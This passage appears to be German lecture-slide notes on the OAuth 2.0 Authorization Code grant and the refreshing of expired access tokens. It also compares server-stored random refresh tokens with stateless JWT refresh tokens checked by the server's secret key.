-   Authorization Code -> Access Token

-   Vorgehen

    -   Client bekommt Autorisierungs-Code (authorization code) vom
        Authorization Server, nachdem der Endnutzer (resource owner)
        dies erlaubt hat, z.B. durch ein Login mit Benutzername und
        Passwort auf dem Authorization Server
    -   Zuvor muss Client beim Authorization Server registriert sein,
        damit Authorization Codes nur an vertrauenswürdige Clients
        herausgegeben werden, also nicht an Clients, die ein Angreifer
        kontrolliert
    -   Client tauscht Autorisierungs-Code dann beim Authorization
        Server gegen ein Access Token ein
    -   Client kann dann mit Access Token auf Ressource beim Resource
        Server zugreifen

[Authorization Code Grant]

[Authorization Code Grant Part 2]

[Parameters]

Workflow, um einen abgelaufenen Token zu refreshen

[Refresh]

Erzeugen und Verwalten von Refresh Tokens Erzeugen von Refresh Token
(Schritte 1, 2)

-   Refresh Token kann eine zufällige Zeichenkette sein

-   Problem

    -   Authorization Server muss dann speichern, welches Refresh Token
        er (für welchen Client) ausgestellt hat, um diesen in Schritt 7
        des Diagramms der vorangegangenen Folie überprüfen zu können
    -   Typischerweise werden solche Refresh Tokens serverseitig in
        einer Datenbank gespeichert
    -   Server verwaltet somit einen Zustand in Form von Refresh Tokens
        -   Server ist stateful
    -   Abhilfe durch JSON Web Tokens (JWT) als Refresh Token
    -   Zustand ist dann in JWT enthalten
    -   JWT Refresh Token muss nicht auf Server gespeichert werden
    -   Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
